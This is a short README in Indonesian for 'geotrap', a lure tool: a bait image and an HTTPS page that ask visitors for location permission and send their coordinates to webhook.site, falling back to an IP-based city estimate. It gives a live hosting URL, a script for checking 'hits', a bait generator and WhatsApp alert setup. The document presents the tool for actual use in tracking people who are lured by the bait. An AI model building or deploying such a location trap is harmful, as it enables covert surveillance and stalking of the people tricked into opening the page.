# geotrap

Gambar umpan + halaman HTTPS yang meminta izin lokasi, mengirim hasil ke webhook.site.

- Live: https://akufikri.github.io/foto/
- Lihat hit: `./hits.sh`
- Regenerate gambar: `python3 make_bait.py`

Notifikasi WhatsApp: isi `CALLMEBOT` di `docs/index.html` dengan `6281xxxx|apikey`
(apikey didapat dengan mengirim `allow` ke +34 644 51 95 23 di WhatsApp).

Batas: geolocation browser butuh tap "Allow". Ditolak => hanya perkiraan IP (level kota).
